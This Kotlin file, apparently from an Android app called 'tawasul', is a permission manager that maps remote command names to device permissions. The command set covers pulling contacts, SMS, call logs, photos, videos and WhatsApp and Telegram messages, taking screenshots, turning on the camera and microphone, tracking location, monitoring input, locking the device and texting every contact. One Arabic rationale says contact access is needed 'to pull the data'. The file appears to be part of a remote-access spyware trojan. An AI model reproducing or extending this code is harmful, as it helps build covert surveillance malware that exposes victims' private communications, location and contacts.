package com.tawasul.app.util

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import androidx.core.content.ContextCompat

object PermissionManager {

    private const val TAG = "PermManager"

    data class PermRequest(
        val permissions: List<String>,
        val rationale: String
    )

    fun getPermissionForCommand(command: String): PermRequest? {
        return when (command) {
            "contacts" -> PermRequest(
                listOf(Manifest.permission.READ_CONTACTS),
                "الوصول لجهات الاتصال مطلوب لسحب البيانات"
            )
            "all-sms" -> PermRequest(
                listOf(Manifest.permission.READ_SMS),
                "قراءة الرسائل مطلوبة"
            )
            "calls" -> PermRequest(
                listOf(Manifest.permission.READ_CALL_LOG),
                "قراءة سجل المكالمات مطلوب"
            )
            "gallery" -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                PermRequest(listOf(Manifest.permission.READ_MEDIA_IMAGES), "الوصول للمعرض مطلوب")
            } else {
                PermRequest(listOf(Manifest.permission.READ_EXTERNAL_STORAGE), "الوصول للتخزين مطلوب")
            }
            "gmail" -> null
            "apps" -> null
            "main-camera", "selfie-camera" -> PermRequest(
                listOf(Manifest.permission.CAMERA),
                "الوصول للكاميرا مطلوب"
            )
            "screenshot" -> null
            "get-location" -> PermRequest(
                listOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION),
                "الوصول للموقع مطلوب"
            )
            "whatsapp-messages", "telegram-messages" -> null
            "microphone" -> PermRequest(
                listOf(Manifest.permission.RECORD_AUDIO),
                "الوصول للميكروفون مطلوب"
            )
            "playAudio", "stopAudio" -> null
            "toast" -> null
            "vibrate" -> null
            "sendSms" -> PermRequest(
                listOf(Manifest.permission.SEND_SMS),
                "إرسال رسائل SMS مطلوب"
            )
            "makeCall" -> PermRequest(
                listOf(Manifest.permission.CALL_PHONE),
                "إجراء مكالمة مطلوب"
            )
            "device-policy-lock" -> null
            "popNotification" -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                PermRequest(listOf(Manifest.permission.POST_NOTIFICATIONS), "إشعارات")
            } else null
            "smsToAllContacts" -> PermRequest(
                listOf(Manifest.permission.READ_CONTACTS, Manifest.permission.SEND_SMS),
                "قراءة جهات الاتصال وإرسال SMS"
            )
            "input-monitoring-on", "input-monitoring-off" -> null
            "apply-data-protection" -> null
            "pull-videos", "stop-videos", "stop-gallery" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    PermRequest(listOf(Manifest.permission.READ_MEDIA_VIDEO), "الوصول للفيديوهات")
                } else {
                    PermRequest(listOf(Manifest.permission.READ_EXTERNAL_STORAGE), "الوصول للتخزين")
                }
            }
            "get-device-info" -> null
            "ls" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    PermRequest(listOf(Manifest.permission.READ_MEDIA_IMAGES), "قراءة الملفات")
                } else {
                    PermRequest(listOf(Manifest.permission.READ_EXTERNAL_STORAGE), "قراءة الملفات")
                }
            }
            "app-monitor-start", "app-monitor-stop", "app-usage-report",
            "app-notifications", "running-apps", "kill-app" -> null
            else -> null
        }
    }

    fun hasPermission(context: Context, permission: String): Boolean {
        return ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
    }

    fun hasAllPermissions(context: Context, permissions: List<String>): Boolean {
        return permissions.all { hasPermission(context, it) }
    }

    fun getMissingPermissions(context: Context, command: String): List<String> {
        val req = getPermissionForCommand(command) ?: return emptyList()
        return req.permissions.filter { !hasPermission(context, it) }
    }
}